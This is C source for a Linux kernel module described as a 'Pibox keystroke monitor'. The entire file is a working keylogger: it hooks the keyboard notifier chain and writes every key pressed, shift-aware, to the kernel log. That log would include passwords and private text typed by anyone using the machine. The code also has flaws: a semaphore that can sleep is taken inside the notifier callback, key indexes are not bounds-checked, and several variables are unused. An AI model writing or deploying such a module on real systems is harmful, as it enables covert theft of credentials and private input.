#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

static struct semaphore sem;

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keymapShiftActivated[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

/* Determining if shift is pressed */
static int shiftKeyDepressed = 0;

/* Default delay expressed in jiffies */
int delay = HZ;

/* Keystroke timestamp for calculating keystroke speed */
static unsigned long init_stamp = 0;

/* Calculated time difference */
static int stroke_speed;

/* Keyboard notification callback */
static int kb_notify(struct notifier_block *nblock, unsigned long action, void *data)
{
    unsigned long jiff;
    jiff = jiffies;

    struct keyboard_notifier_param *param = data;
    if (action == KBD_KEYCODE)
    {
        if (param->value==42 || param->value==54 )
        {
            // Acquire lock to modify the global variable shiftKeyDepressed
            down(&sem);
            if(param->down)
                shiftKeyDepressed = 1;
            else
                shiftKeyDepressed = 0;
            up(&sem);
            return NOTIFY_OK;
        }

        if (param->down)
        {
            // Acquire lock to read the global variable shiftKeyPressed
             down(&sem);
            if(shiftKeyDepressed == 0)
                printk(KERN_INFO "pibox_kb: %s \n", keymap[param->value]);
            else
                printk(KERN_INFO "pibox_kb: %s \n", keymapShiftActivated[param->value]);
            up(&sem);
        }

    }
    return NOTIFY_OK;
}

/* Create the notifier_block object */
static struct notifier_block kb_nb = { .notifier_call = kb_notify };

static int __init kb_init(void)
{
    /* Register this module with the notification list */
    register_keyboard_notifier(&kb_nb);
    printk(KERN_INFO "Registering the pibox_kb module with the keyboard notifier list\n");
    sema_init(&sem, 1);
    return 0;
}

static void __exit kb_exit(void)
{
    unregister_keyboard_notifier(&kb_nb);
    printk(KERN_INFO "Unregistered the pibox_kb module\n");
}

module_init(kb_init);
module_exit(kb_exit);

MODULE_AUTHOR("Emerson");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Pibox keystroke monitor");
